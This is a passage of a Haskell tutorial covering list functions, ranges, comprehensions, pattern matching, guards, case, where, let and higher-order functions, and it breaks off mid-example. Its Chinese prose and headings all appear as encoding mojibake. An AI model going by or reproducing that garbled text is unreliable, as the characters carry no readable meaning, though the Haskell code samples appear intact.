            -  `11.4.3 <\*\*> <#lt-gt-1>`__
            -  `11.4.4 when & unless <#when-amp-unless>`__
            -  `11.4.5 sequenceA <#sequenceA>`__

      -  `12 Monad <#Monad>`__

         -  `12.1 Monad ÂÆû‰æã <#MonadÂÆû‰æã>`__

            -  `12.1.1 Maybe <#Maybe-2>`__
            -  `12.1.2 [] <#-2>`__
            -  `12.1.3 IO <#IO-2>`__
            -  `12.1.4 (->) r <#gt-r-2>`__

         -  `12.2 do-notation <#do-notation>`__

            -  `12.2.1 ApplicativeDo <#ApplicativeDo>`__

         -  `12.3 Monad Laws <#Monad-Laws>`__

            -  `12.3.1 ÁªÑÂêàËøêÁÆóÁ¨¶Ôºà>=>ÔºâÂΩ¢Âºè <#ÁªÑÂêàËøêÁÆóÁ¨¶Ôºà-gt-gt-ÔºâÂΩ¢Âºè>`__
            -  `12.3.2 do-notationÂΩ¢Âºè <#do-notationÂΩ¢Âºè>`__

         -  `12.4 Intuition <#Intuition-2>`__
         -  `12.5 Â∏∏Áî®ÂáΩÊï∞ <#Â∏∏Áî®ÂáΩÊï∞-2>`__

            -  `12.5.1 liftM & ap <#liftM-amp-ap>`__
            -  `12.5.2 sequence <#sequence-1>`__
            -  `12.5.3 replicateM <#replicateM>`__
            -  `12.5.4 mapM & forM <#mapM-amp-forM>`__
            -  `12.5.5 =<< & >=> & <=< <#lt-lt-amp-gt-gt-amp-lt-lt>`__

      -  `13 MonadFail <#MonadFail>`__

         -  `13.1 MonadFail ÂÆû‰æã <#MonadFailÂÆû‰æã>`__
         -  `13.2 MonadFail Law <#MonadFail-Law>`__

      -  `14 Semigroup <#Semigroup>`__

         -  `14.1 Semigroup Law <#Semigroup-Law>`__
         -  `14.2 Ë°•ÔºöNonEmpty <#Ë°•ÔºöNonEmpty>`__

      -  `15 Monoid <#Monoid>`__

         -  `15.1 ÂÆû‰æã <#ÂÆû‰æã>`__

            -  `15.1.1 [a] <#a-1>`__
            -  `15.1.2 Ordering <#Ordering>`__
            -  `15.1.3 Sum & Product <#Sum-amp-Product>`__
            -  `15.1.4 All & Any <#All-amp-Any>`__
            -  `15.1.5 Monoid a => Maybe a <#Monoid-a-gt-Maybe-a>`__
            -  `15.1.6 First & Last <#First-amp-Last>`__
            -  `15.1.7 Min & Max <#Min-amp-Max>`__
            -  `15.1.8 ÂÖÉÁªÑ <#ÂÖÉÁªÑ>`__

         -  `15.2 Monoid Laws <#Monoid-Laws>`__

      -  `16 Monoidal classes <#Monoidal-classes>`__

         -  `16.1 Alternative <#Alternative>`__

            -  `16.1.1 Alternative ÂÆû‰æã <#AlternativeÂÆû‰æã>`__
            -  `16.1.2 Alternative Laws <#Alternative-Laws>`__
            -  `16.1.3 Â∏∏Áî®ÂáΩÊï∞ <#Â∏∏Áî®ÂáΩÊï∞-3>`__

         -  `16.2 MonadPlus <#MonadPlus>`__

            -  `16.2.1 MonadPlus ÂÆû‰æã <#MonadPlusÂÆû‰æã>`__
            -  `16.2.2 MonadPlus Laws <#MonadPlus-Laws>`__
            -  `16.2.3 Â∏∏Áî®ÂáΩÊï∞ <#Â∏∏Áî®ÂáΩÊï∞-4>`__

         -  `16.3 ArrowPlus <#ArrowPlus>`__

      -  `17 ‰∏Ä‰∫õÂÖ∂ÂÆÉtypeclasses <#‰∏Ä‰∫õÂÖ∂ÂÆÉtypeclasses>`__

         -  `17.1 Foldable <#Foldable>`__

            -  `17.1.1 Foldable ÂÆû‰æã <#FoldableÂÆû‰æã>`__
            -  `17.1.2 Â∏∏Áî®ÂáΩÊï∞ <#Â∏∏Áî®ÂáΩÊï∞-5>`__

         -  `17.2 Traversable <#Traversable>`__

            -  `17.2.1 Traversable ÂÆû‰æã <#TraversableÂÆû‰æã>`__
            -  `17.2.2 Traversable Laws <#Traversable-Laws>`__

         -  `17.3 Bifunctor <#Bifunctor>`__

            -  `17.3.1 Bifunctor Laws <#Bifunctor-Laws>`__

         -  `17.4 Category <#Category>`__
         -  `17.5 Arrow <#Arrow>`__

            -  `17.5.1 Arrow notation <#Arrow-notation>`__
            -  `17.5.2 ArrowChoice <#ArrowChoice>`__
            -  `17.5.3 ArrowZero & ArrowPlus <#ArrowZero-amp-ArrowPlus>`__
            -  `17.5.4 ‰æãÂ≠ê <#‰æãÂ≠ê>`__

      -  `18 Haskell ‰∏éËåÉÁï¥ËÆ∫ <#Haskell‰∏éËåÉÁï¥ËÆ∫>`__

         -  `18.1 ËåÉÁï¥ÔºàCategoryÔºâ <#ËåÉÁï¥ÔºàCategoryÔºâ>`__

            -  `18.1.1 ËåÉÁï¥ÂÖ¨ÁêÜ <#ËåÉÁï¥ÂÖ¨ÁêÜ>`__
            -  `18.1.2 $\\mathbf{Hask}$ ËåÉÁï¥ <#mathbf-Hask-ËåÉÁï¥>`__

         -  `18.2 ÂáΩÂ≠êÔºàFunctorsÔºâ <#ÂáΩÂ≠êÔºàFunctorsÔºâ>`__

            -  `18.2.1 ÂáΩÂ≠êÂÖ¨ÁêÜ <#ÂáΩÂ≠êÂÖ¨ÁêÜ>`__
            -  `18.2.2 $\\mathbf{Hask}$ ËåÉÁï¥‰∏äÁöÑÂáΩÂ≠ê <#mathbf-Hask-ËåÉÁï¥‰∏äÁöÑÂáΩÂ≠ê>`__

         -  `18.3 ÂçïÂ≠êÔºàMonadsÔºâ <#ÂçïÂ≠êÔºàMonadsÔºâ>`__

            -  `18.3.1 ÂçïÂ≠êÂÖ¨ÁêÜ <#ÂçïÂ≠êÂÖ¨ÁêÜ>`__

      -  `19 ÂêéËÆ∞ <#ÂêéËÆ∞>`__
      -  `20 Reference <#Reference>`__


   .. rubric:: ` <#Âü∫Á°ÄËøêÁÆó>`__ Âü∫Á°ÄËøêÁÆó
      :name: Âü∫Á°ÄËøêÁÆó

    .. code-block:: 

        + - * / ()      ÔºöÂä†Âáè‰πòÈô§
        div             ÔºöÊï¥Èô§
        mod             ÔºöÂèñÊ®°
        True False      ÔºöÂ∏ÉÂ∞îÂÄº
        || && not       ÔºöÊàñ‰∏îÈùû
        ==              ÔºöÊù°‰ª∂Âà§Êñ≠ÔºåÁõ∏Á≠â
        /=              ÔºöÊù°‰ª∂Âà§Êñ≠Ôºå‰∏çÁ≠â


   .. rubric:: ` <#ÂáΩÊï∞Ë∞ÉÁî®>`__ ÂáΩÊï∞Ë∞ÉÁî®
      :name: ÂáΩÊï∞Ë∞ÉÁî®

      Haskell ‰∏≠Ë∞ÉÁî®ÂáΩÊï∞‰∏çÂä†Êã¨Âè∑ÔºåÂÖàÂÜôÂá∫ÂáΩÊï∞ÂêçÔºåÁÑ∂ÂêéÈÄê‰∏™ÂàóÂá∫ÂèÇÊï∞ÔºåÁî®Á©∫Ê†ºÈöîÂºÄ„ÄÇ
      ËøêÁÆóÁ¨¶‰πüÊòØÂáΩÊï∞ÔºåÊòØ‰∏≠ÁºÄÂáΩÊï∞Ôºàinfix operatorsÔºâÔºö

      .. code-block:: haskell

           ghci> max 1 2
           2
           ghci> 1 + 1
           2

      ËøôÁßçÂáΩÊï∞ÂêçÁß∞ÊâìÂ§¥ÔºåÂèÇËÄÉÂêéË∑üÁöÑËØ≠Ê≥ïÁß∞‰∏∫ÂáΩÊï∞ÁöÑÂâçÁºÄË°®ËææÔºàprefixÔºâ„ÄÇÂáΩÊï∞ÂèØ‰ª•ÂÜôÂú®ÂèÇÊï∞‰∏≠Èó¥Ôºå
      ËøôÁßçÂΩ¢ÂºèÁß∞‰∏∫‰∏≠ÁºÄË°®ËææÔºàinfixÔºâÔºåHaskell ÊâÄÊúâËøêÁÆóÁ¨¶ÈÉΩÈªòËÆ§‰∏∫‰∏≠ÁºÄ„ÄÇ

      ÂâçÁºÄÔºàprefixÔºâÂáΩÊï∞‰∏é‰∏≠ÁºÄÔºàinfixÔºâÂáΩÊï∞ËΩ¨Êç¢Ôºö

      -  ÂØπÂâçÁºÄÂáΩÊï∞Âä†ÂèåÂèçÂºïÂè∑ \`\` ‰ΩøÂÖ∂ÂèòÊàê‰∏≠ÁºÄÂáΩÊï∞
      -  ÂØπ‰∏≠ÁºÄÂáΩÊï∞Âä†ÂúÜÊã¨Âè∑ () ‰ΩøÂÖ∂ÂèòÊàêÂâçÁºÄÂáΩÊï∞

      .. container:: float highlight haskell

         ::

            ghci> 4 `div` 2
            2
            ghci> 1 `max` 2
            2
            ghci> (+) 1 2
            3
            ghci> (||) True False
            True

   .. rubric:: ` <#List>`__ List
      :name: List

      ÂàóË°®ÊòØ Haskell ‰∏≠ÂæàÂ∏∏ËßÅÁöÑÊï∞ÊçÆÁ±ªÂûãÔºåÂíå Python ‰∏≠‰∏çÂêåÔºåHaskell ‰∏≠ÁöÑÂàóË°®‰∏≠ÁöÑÊâÄÊúâÂÖÉÁ¥†ÂøÖÈ°ªÊòØÂêå‰∏Ä‰∏™Á±ªÂûã„ÄÇ

      ‰ª•‰∏ãÊòØÂàóË°®Â∏∏Áî®ÁöÑÂáΩÊï∞Ôºö

      -  ``(++)``    :: [a] -> [a] -> [a]ÔºöÂêàÂπ∂‰∏§‰∏™ÂàóË°®
      -  ``(:)``     :: a -> [a] -> [a]  ÔºöÂ∞ÜÂçï‰∏™ÂÖÉÁ¥†Âπ∂ÂÖ•ÂàóË°®„ÄÇ [1, 2, 3] ÊòØ 1:2:3:[] ÁöÑËØ≠Ê≥ïÁ≥ñ
      -  ``(!!)``    :: [a] -> Int -> a  ÔºöÈÄöËøáÁ¥¢ÂºïÂèñÂá∫Êüê‰∏™‰ΩçÁΩÆ‰∏äÁöÑÂÖÉÁ¥†„ÄÇa !! 1 Áõ∏ÂΩì‰∫é Python ‰∏≠ÁöÑ a[1]
      -  ``head``    :: [a] -> a         ÔºöËøîÂõûÂàóË°®ÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†
      -  ``tail``    :: [a] -> [a]       ÔºöËøîÂõûÂàóË°®‰∏≠Èô§ÂéªÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†ÂêéÁöÑÂàóË°®ÔºàËã•Âè™Êúâ‰∏Ä‰∏™ÂÖÉÁ¥†ÂàôËøîÂõûÁ©∫ÂàóË°®[]Ôºâ
      -  ``last``    :: [a] -> a         ÔºöËøîÂõûÂàóË°®‰∏≠ÁöÑÊúÄÂêé‰∏Ä‰∏™ÂÖÉÁ¥†
      -  ``init``    :: [a] -> [a]       ÔºöËøîÂõûÂàóË°®‰∏≠Èô§ÂéªÊúÄÂêé‰∏Ä‰∏™ÂÖÉÁ¥†ÂêéÁöÑÂàóË°®
      -  ``reverse`` :: [a] -> [a]                       ÔºöËøîÂõûÁøªËΩ¨ÂêéÁöÑÂàóË°®
      -  ``take``    :: Int -> [a] -> [a]                ÔºöËøîÂõûÂàóË°®aÁöÑÂâçn‰∏™ÂÖÉÁ¥†ÁöÑÂàóË°®(take n a)
      -  ``drop``    :: Int -> [a] -> [a]                ÔºöËøîÂõûÂàóË°®a‰∏≠Èô§ÂéªÂâçn‰∏™ÂÖÉÁ¥†ÂêéÁöÑÂàóË°®(drop n a)
      -  ``length``  :: Foldable t => t a -> Int         ÔºöËøîÂõûÂàóË°®ÁöÑÈïøÂ∫¶
      -  ``null``    :: Foldable t => t a -> Bool        ÔºöËøîÂõûÂàóË°®ÊòØÂê¶‰∏∫Á©∫
      -  ``maximum`` :: (Foldable t, Ord a) => t a -> a  ÔºöËøîÂõûÂàóË°®‰∏≠ÁöÑÊúÄÂ§ßÂÄº
      -  ``minimum`` :: (Foldable t, Ord a) => t a -> a  ÔºöËøîÂõûÂàóË°®‰∏≠ÁöÑÊúÄÂ∞èÂÄº
      -  ``sum``     :: (Foldable t, Num a) => t a -> a  ÔºöËøîÂõûÂàóË°®‰∏≠ÊâÄÊúâÂÖÉÁ¥†ÁöÑÂíå
      -  ``product`` :: (Foldable t, Num a) => t a -> a  ÔºöËøîÂõûÂàóË°®‰∏≠ÊâÄÊúâÂÖÉÁ¥†ÁöÑÁßØ
      -  ``elem``    :: (Foldable t, Eq a) => t a -> BoolÔºöÂà§Êñ≠ÂÄº n ÊòØÂê¶Âú®ÂàóË°® a ‰∏≠(

         .. container:: float highlight haskell

            ::

               elem n a
               -- Êàñ
               n `elem`  a --Áî®ÂèåÂèçÂºïÂè∑ `` ÂåÖ‰∏äÂèØ‰ª•ÂèòÊàê‰∏≠ÁºÄÂáΩÊï∞‰ΩøÁî®


      .. rubric:: ` <#Texas-ranges>`__ Texas ranges
         :name: Texas-ranges

      ‰ΩøÁî® ``..`` ÂèØ‰ª•Ë°®Á§∫Âá∫ËåÉÂõ¥Âπ∂Ëá™Âä®Êé®ÂØºÔºö

      .. container:: float highlight haskell

         .. code-block:: haskell

               ghci> [1 .. 10]  
               [1,2,3,4,5,6,7,8,9,10]  
               ghci> ['a' .. 'z']  
               "abcdefghijklmnopqrstuvwxyz"  
               ghci> ['K' .. 'Z']  
               "KLMNOPQRSTUVWXYZ" 
               ghci> [2, 4 .. 20]  
               [2,4,6,8,10,12,14,16,18,20]  
               ghci> [3, 6 .. 20]  
               [3,6,9,12,15,18]
               ghci> [5, 4 .. 1]
               [5,4,3,2,1]

      Â¶Ç [1..]„ÄÅ[1, 3..] ‰πüÂèØ‰ª•Áî®Êù•ÁîüÊàêÊó†Á©∑ÂàóË°®Ôºå‰πüÊúâÂáΩÊï∞ÂèØ‰ª•ÁîüÊàêÊó†Á©∑ÂàóË°®Ôºö

      -  ``cycle`` :: [a] -> [a]ÔºöÂ∞ÜÂéüÂàóË°®‰∏çÊñ≠Âæ™ÁéØÁîüÊàêÊó†Á©∑ÂàóË°®
      -  ``repeat`` :: a -> [a]ÔºöÂ∞Ü‰º†ÂÖ•ÁöÑÂÄº‰∏çÊñ≠ÈáçÂ§çÁîüÊàêÊó†Á©∑ÂàóË°®
      -  ``replicate`` :: Int -> a -> [a]ÔºöÂ∞ÜÂÄº a ÈáçÂ§ç n Ê¨° (replicate n a)

      .. rubric:: ` <#List-comprehension>`__ List
         comprehension
         :name: List-comprehension

      Haskell ‰πüÊúâÂàóË°®Êé®ÂØºÔºåÂΩ¢ÂºèÊòØ‰∏Ä‰∏™‰∏≠Êã¨Âè∑ÔºåÁ´ñÊù†Â∑¶‰æß‰∏∫Ë°®ËææÂºèÔºåÂè≥‰æß‰∏∫ÂèòÈáèÁöÑËåÉÂõ¥ÂíåÁ∫¶ÊùüÊù°‰ª∂„ÄÇ

      .. container:: float highlight haskell

         ::

            ghci> [x * 2 | x <- [1 .. 10]]  
            [2,4,6,8,10,12,14,16,18,20]

            ghci> [x * 2 | x <- [1 .. 10], x * 2 >= 12]  
            [12,14,16,18,20]

            ghci> [ x | x <- [50 .. 100], x `mod` 7 == 3]  
            [52,59,66,73,80,87,94]

            ghci> [x * y | x <- [2, 5, 10], y <- [8, 10, 11]]  
            [16,20,22,40,50,55,80,100,110]


   .. rubric:: ` <#Tuple>`__ Tuple
      :name: Tuple

      Haskell ÂÖÉÁªÑÂèØ‰ª•Êúâ‰∏çÂêåÈïøÂ∫¶ÔºåÂÖÉÁ¥†ÂèØ‰ª•Êúâ‰∏çÂêåÁ±ªÂûã„ÄÇÂÖÉÁªÑÁöÑÁ±ªÂûãÁî±ÊâÄÊúâÂÖÉÁ¥†ÁöÑÁ±ªÂûãÂÖ±ÂêåÂÜ≥ÂÆö„ÄÇ
      Â∏∏Áî®ÁöÑÂÖÉÁªÑÁõ∏ÂÖ≥ÂáΩÊï∞Ôºö

      -  ``fst`` :: (a, b) -> a ËøîÂõûÂê´Êúâ‰∏§‰∏™ÂÖÉÁ¥†ÂÖÉÁªÑ‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†
      -  ``snd`` :: (a, b) -> b ËøîÂõûÂê´Êúâ‰∏§‰∏™ÂÖÉÁ¥†ÂÖÉÁªÑ‰∏≠ÁöÑÁ¨¨‰∫å‰∏™ÂÖÉÁ¥†
      -  ``zip`` :: [a] -> [b] -> [(a, b)] Êé•Êî∂‰∏§‰∏™ÂàóË°®ÔºåËøîÂõû‰∏Ä‰∏™ÂàóË°®ÔºàÂÖÉÁ¥†‰∏∫‰∏§‰∏äËæìÂÖ•ÂàóË°®ÁöÑÂÖÉÁ¥†ÈÖçÂØπÔºâ


   .. rubric:: ` <#Syntax-in-Functions>`__ Syntax in
      Functions
      :name: Syntax-in-Functions

      ‰ª•‰∏ãÂÆö‰πâ‰∏Ä‰∏™ plus ÂáΩÊï∞ÔºåÂπ∂ÁúÅÁï•ÂÖ∂Á±ªÂûãÔºö

      .. container:: float highlight haskell

        ::

            ghci> plus x y = x + y
            ghci> :t plus
            plus :: Num a => a -> a -> a   

      Haskell ‰ºöËá™Âä®Êé®Êñ≠ÂáΩÊï∞ÁöÑÁ±ªÂûãÔºåÊúÄÂ•ΩÂú®ÂÆö‰πâÂáΩÊï∞ÂâçÂ£∞ÊòéÂáΩÊï∞ÁöÑÁ±ªÂûãÔºö

      .. container:: float highlight haskell
         
          ::

             plus :: (Num a) => a -> a -> a
             plus x y = x + y

      .. rubric:: ` <#Pattern-matching>`__ Pattern matching
         :name: Pattern-matching

         ÂáΩÊï∞ÂÆö‰πâÂèØ‰ª•‰ΩøÁî®Ê®°ÂºèÂåπÈÖçËØ≠Ê≥ïÔºåËøô‰∏ÄÁÇπ‰ΩìÁé∞‰∫ÜÂáΩÊï∞Âç≥Êò†Â∞ÑÁöÑÊú¨Ë¥®„ÄÇË∞ÉÁî®ÂáΩÊï∞Êó∂ÔºåÊ†πÊçÆÂèÇÊï∞Êò†Â∞Ñ
         Âà∞Áõ∏Â∫îÁöÑÂáΩÊï∞‰ΩìÔºåÂπ∂ËøîÂõûÁõ∏Â∫îÁöÑÂÄº„ÄÇÊ®°ÂºèÂåπÈÖç‰ªéÂâçÂà∞Âêé‰æùÊ¨°Âà§Êñ≠ÔºåPattern Matching ÈÄê‰∏™ÂåπÈÖçÔºå
         Áõ¥Âà∞ÂåπÈÖçÊàêÂäüÔºå‰πüÂõ†Ê≠§ÔºåÊúÄÂêéÂøÖÈ°ªË¶ÅÁªôÂá∫‰∏ÄÁßçÈÄöÁî®ÁöÑÂåπÈÖçÊù•Êé•Êî∂‰∏éÁªôÂá∫Ê®°ÂºèÂÖ®‰∏çÂåπÈÖçÁöÑËæìÂÖ•„ÄÇÂ¶ÇÔºö

         .. container:: float highlight haskell

            ::

               factorial :: (Integral a) => a -> a
               factorial 0 = 1
               factorial n = n * factorial (n - 1)

               first :: (a, b, c) -> a
               first (x, _, _) = x

               second :: (a, b, c) -> b
               second (_, y, _) = y

               third :: (a, b, c) -> c
               third (_, _, z) = z
            

         ÂÖ∂‰∏≠Ôºå‰∏ãÂàíÁ∫ø ``_`` Ë°®Á§∫‰ªª‰ΩïÂÄºÔºå‰∏î‰∏çÂÖ≥ÂøÉÂÆÉÁöÑÂÜÖÂÆπÔºåÂè™ÊòØ‰∏Ä‰∏™Âç†‰ΩçÁ¨¶Âè∑„ÄÇ

         ÂàóË°®ÁöÑ (:) ËøêÁÆóÁ¨¶Âè∑‰πüÂèØ‰ª•Áî®Êù•ËøõË°åÊ®°ÂºèÂåπÈÖçÔºö

         .. container:: float highlight haskell
            
             ::

                head' :: [a] -> a
                head' [] = error "Can't call head on an empty list, dummy!"
                head' (x:_) = x

                sum' :: (Num a) => [a] -> a
                sum' [] = 0
                sum' (x:xs) = x + sum' xs

         Âú®ÈíàÂØπÂàóË°®ËøõË°åÊ®°ÂºèÂåπÈÖçÊó∂ÔºåÂ¶ÇÊûúÂêåÊó∂ÈúÄË¶ÅÊï¥‰∏™ÂàóË°®„ÄÅÂàóË°®ÁöÑÁ¨¨‰∏Ä‰∏™ÂÄº„ÄÅÂàóË°®Èô§Á¨¨‰∏Ä‰∏™ÂÄºÂ§ñÁöÑÂÜÖÂÆπÔºå
         ÂèØ‰ª•‰ΩøÁî® ``xs@(x:rest)`` ËøôÊ†∑ÁöÑËØ≠Ê≥ïÔºåx Âíå rest Â∞ÜÂàÜÂà´ÁªëÂÆöÂàóË°®ÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†„ÄÅ‰Ωô‰∏ãÂÖÉÁ¥†„ÄÇ
         ÊØîÂ¶Ç ``xs@(q:qs)`` ÂåπÈÖç [1, 2, 3] ÂàóË°®Ôºåxs Â∞±‰∏∫ [1, 2, 3]Ôºåq ‰∏∫ 1Ôºåqs ‰∏∫ [2, 3]

         ‰ª•‰∏äËøôÁßç var@pat ÂåπÈÖçÊ®°ÂºèÁß∞‰∏∫ as-patterns„ÄÇ
         
         ‰ΩÜÊòØÔºå(++) Êìç‰Ωú‰∏çÂèØ‰ª•Áî®Êù•Ê®°ÂºèÂåπÈÖç„ÄÇ

      .. rubric:: ` <#Guard-syntax>`__ Guard syntax
         :name: Guard-syntax

         ÂáΩÊï∞ÂÆö‰πâÂèØ‰ª•‰ΩøÁî®ÂÆàÂç´ÔºàguardÔºâËØ≠Ê≥ï‰ª•Áº©Áü≠ÂáΩÊï∞‰ΩìÁöÑÁºñÂÜôÔºö

         .. container:: float highlight haskell
         ::

            max' :: (Ord a) => a -> a -> a  
            max' a b   
                | a > b     = a  
                | otherwise = b 

         ÂÖàÁªôÂá∫‰º†ÂÖ•ÁöÑÂèÇÊï∞ÂèòÈáèÔºåÁÑ∂Âêé‰∏ã‰∏ÄË°åÁº©ËøõÂêéÂä†Á´ñÊù†Ôºà|ÔºâÔºåÁ´ñÊù†Âà∞Á≠âÂè∑ÂâçÁöÑË°®ËææÂºèË°®Á§∫ËøõË°åÊù°‰ª∂Âà§Êñ≠Ôºå
         Â¶ÇÊûú‰∏∫ True ÂàôËøîÂõûÁ≠âÂè∑ÂêéÈù¢ÁöÑÂÄºÔºõÂ¶ÇÊûú‰∏∫ False ÂàôÁªßÁª≠Âà§Êñ≠‰∏ã‰∏ÄË°åÔºåÁõ¥Âà∞ otherwise„ÄÇ

      .. rubric:: ` <#Case-expressions>`__ Case expressions
         :name: Case-expressions

         Âú®ÂáΩÊï∞ÁöÑÂÆö‰πâ‰∏≠Ôºå‰πüÂèØ‰ª•Â∞Ü case Ë°®ËææÂºèÈÖçÂêàÊ®°ÂºèÂåπÈÖç‰ΩøÁî®Ôºö

         .. container:: float highlight haskell
         ::

            case expression of pattern -> result  
                               pattern -> result
                               ...  

         ‰æãÂ¶ÇÔºö

         .. container:: float highlight haskell
         ::

            head' :: [a] -> a  
            head' [] = error "No head for empty lists!"  
            head' (x:_) = x  
            -- Á≠â‰ª∑‰∫éÔºö
            head' :: [a] -> a  
            head' xs = case xs of [] -> error "No head for empty lists!"  
                                  (x:_) -> x  

         .. container:: float highlight haskell
         ::

            describeList :: [a] -> String  
            describeList xs = "The list is " ++ case xs of [] -> "empty."  
                                                           [x] -> "a singleton list."   
                                                           xs -> "a longer list."  
            -- Á≠â‰ª∑‰∫éÔºö
            describeList :: [a] -> String  
            describeList xs = "The list is " ++ what xs  
                where what [] = "empty."  
                      what [x] = "a singleton list."  
                      what xs = "a longer list." 

      .. rubric:: ` <#where>`__ where
         :name: where

         Â£∞ÊòéÂú®ÂáΩÊï∞ÂÆö‰πâ‰∏≠Ë¶Å‰ΩøÁî®ÁöÑÂ±ÄÈÉ®ÂèòÈáèÔºåÂèØ‰ª•‰ΩøÁî® where ÂÖ≥ÈîÆÂ≠óÔºö

         .. container:: float highlight haskell
         ::

            initials :: String -> String -> String  
            initials firstname lastname = [f] ++ ". " ++ [l] ++ "."  
                where (f:_) = firstname  
                      (l:_) = lastname  

         where ‰ªéÂè•‰∏≠‰πüÂèØ‰ª•‰ΩøÁî®Ê®°ÂºèÂåπÈÖç„ÄÇ

      .. rubric:: ` <#let>`__ let
         :name: let

         Âú®ÂáΩÊï∞ÁöÑÂÆö‰πâ‰∏≠‰ΩøÁî® let Ë°®ËææÂºè (let expression)Ôºö``let <bindings> in <expression>``Ôºå
         Ê≠§Ë°®ËææÂºè‰πüÂèØ‰ª•Âú®ÊôÆÈÄöÁÆóÂºèÊàñÂàóË°®‰∏≠‰ΩøÁî®ÔºåÂÆÉÂ±û‰∫é‰∏ä‰∏ãÊñáÊó†ÂÖ≥ÔºàContext-FreeÔºâÁöÑË°®ËææÂºè„ÄÇ

         let ÂêéË∑ü‰ªªÊÑèÊï∞ÈáèÁöÑÂ±ÄÈÉ®ÂÆö‰πâÔºåin ÂÖ≥ÈîÆÂ≠óÂ∞ÜËøô‰∫õÂ±ÄÈÉ®ÂÆö‰πâ‰∏é‰∏ªË¶ÅË°®ËææÂºèÂàÜÂºÄÔºö

         .. container:: float highlight haskell
         ::

            cylinder :: (RealFloat a) => a -> a -> a  
            cylinder r h = 
                let sideArea = 2 * pi * r * h  
                    topArea = pi * r ^2  
                in  sideArea + 2 * topArea  

         .. container:: float highlight haskell
         ::

            ghci> 4 * (let a = 9 in a + 1) + 2  
            42 
            ghci> [let square x = x * x in (square 5, square 3, square 2)]  
            [(25,9,4)] 


      .. rubric:: ` <#if-statement>`__ if statement
         :name: if-statement

         Haskell ‰∏≠ÁöÑ if Êù°‰ª∂ËØ≠Âè•ËØ≠Ê≥ï‰∏∫Ôºö

         .. container:: float highlight haskell
         ::

            if ... then ...
            else ...
            -- or if ... then ... else ...
            -- or
            if ... then ...
            else if ... then ...
            else ...

         ÊúÄÂêéÁöÑ else Êó†ËÆ∫Â¶Ç‰Ωï‰πü‰∏çÂèØ‰ª•ÁúÅÂéª„ÄÇ


   .. rubric:: ` <#Higher-Order-Functions>`__ Higher Order Functions
      :name: Higher-Order-Functions

      .. rubric:: ` <#Currying>`__ Currying
         :name: Currying

         Haskell ÂáΩÊï∞ÊòØÊüØÈáåÂåñÂáΩÊï∞ÔºàCurryingÔºâÔºåÂáΩÊï∞ÈÉΩÂè™Êé•Êî∂‰∏Ä‰∏™ÂèÇÊï∞„ÄÇÊé•Êî∂‰∏§‰∏™ÂèÇÊï∞ÁöÑÂáΩÊï∞ÂÆûÈôÖ‰∏ä
         ÊòØËøô‰∏™ÂáΩÊï∞Êé•Êî∂‰∫ÜÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÂêéÔºåËøîÂõû‰∫Ü‰∏Ä‰∏™Êé•Êî∂Á¨¨‰∫å‰∏™ÂèÇÊï∞ÁöÑÂáΩÊï∞ÔºåÊúÄÂêéËøîÂõûÊúÄÁªàÁöÑÁªìÊûú„ÄÇÊØîÂ¶Ç
         max ÂáΩÊï∞ÔºåÂÆÉÁöÑÁ±ªÂûãÁ≠æÂêçÊòØÔºö

            max :: Ord a => a -> a -> a

         ÂèØ‰ª•ÁúãÊàê a -> (a -> a)ÔºåÂç≥Êé•Êî∂‰∏Ä‰∏™ÂèÇÊï∞ÔºåËøîÂõû‰∏Ä‰∏™Á±ªÂûã‰∏∫ a -> a ÁöÑÂáΩÊï∞„ÄÇ
         ÊØîÂ¶Ç max 1 ÁöÑÁ±ªÂûãÁ≠æÂêçÊòØÔºö

            max 1 :: (Ord a, Num a) => a -> a

         Âõ†Ê≠§ max 1 2Ôºå‰πüÂ∞±Á≠âÂêå‰∫é (max 1) 2ÔºåÂç≥ÂØπÊï∞Â≠ó 2 Â∫îÁî®ÂáΩÊï∞ max 1„ÄÇ

         ÂáΩÊï∞‰πüÂèØ‰ª•Êé•Êî∂ÂáΩÊï∞‰Ωú‰∏∫ÂèÇÊï∞ÔºåÂèÇÊï∞ÊúâÂáΩÊï∞ÁöÑÂáΩÊï∞Â∞±Ë¢´Áß∞‰∏∫È´òÈò∂ÂáΩÊï∞ÔºàHigher Order FunctionsÔºâ

      .. rubric:: ` <#‰∏Ä‰∫õÈ´òÈò∂ÂáΩÊï∞>`__ ‰∏Ä‰∫õÈ´òÈò∂ÂáΩÊï∞
         :name: ‰∏Ä‰∫õÈ´òÈò∂ÂáΩÊï∞

         .. rubric:: ` <#zipWith>`__ zipWith
            :name: zipWith

            zipWith :: (a -> b -> c) -> [a] -> [b] -> [c]

            Á¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫‰∏Ä‰∏™ÂáΩÊï∞ÔºåÁÑ∂ÂêéÊé•Êî∂‰∏§‰∏™ÂàóË°®ÔºåÂ∞ÜÂÖ∂ÂØπÂ∫îÂÖÉÁ¥†‰º†ÂÖ•Êé•Êî∂ÁöÑÂáΩÊï∞‰∏≠ÔºåÂæóÂà∞ÁöÑÁªìÊûúÁªÑÊàê
            ‰∏Ä‰∏™Êñ∞ÁöÑÂàóË°®„ÄÇÂ¶ÇÊûú‰∏§‰∏™‰º†ÂÖ•ÁöÑÂàóË°®ÈïøÂ∫¶‰∏çÂêåÔºå‰ª•ÊúÄÁü≠ÁöÑÂàóË°®‰∏∫ÂáÜÔºåÈïøÂàóË°®‰∏≠Ë∂ÖÂá∫ÁöÑÂÖÉÁ¥†ÁúÅÁï•„ÄÇ

            .. container:: float highlight haskell
            ::

               ghci> zipWith (+) [4,2,5,6] [2,6,2,3]  
               [6,8,7,9]  

               ghci> zipWith max [6,3,2,1] [7,3,1,5]  
               [7,3,2,5]  

         .. rubric:: ` <#flip>`__ flip
            :name: flip

            flip :: (a -> b -> c) -> b -> a -> c

            flip ÂáΩÊï∞Êé•Êî∂‰∏Ä‰∏™‰∫åÂÖÉÂáΩÊï∞ÔºåËøîÂõû‰∏Ä‰∏™Êñ∞ÁöÑ‰∫åÂÖÉÂáΩÊï∞ÔºåÂ∞ÜÂÖ∂ËæìÂÖ•ÁöÑ‰∏§‰∏™ÂèÇÊï∞È°∫Â∫èÂèçËΩ¨Ôºö

            .. container:: float highlight haskell
            ::

               ghci> zip [1,2,3,4,5] "hello"
               [(1,'h'),(2,'e'),(3,'l'),(4,'l'),(5,'o')]

               ghci> flip zip [1,2,3,4,5] "hello"  
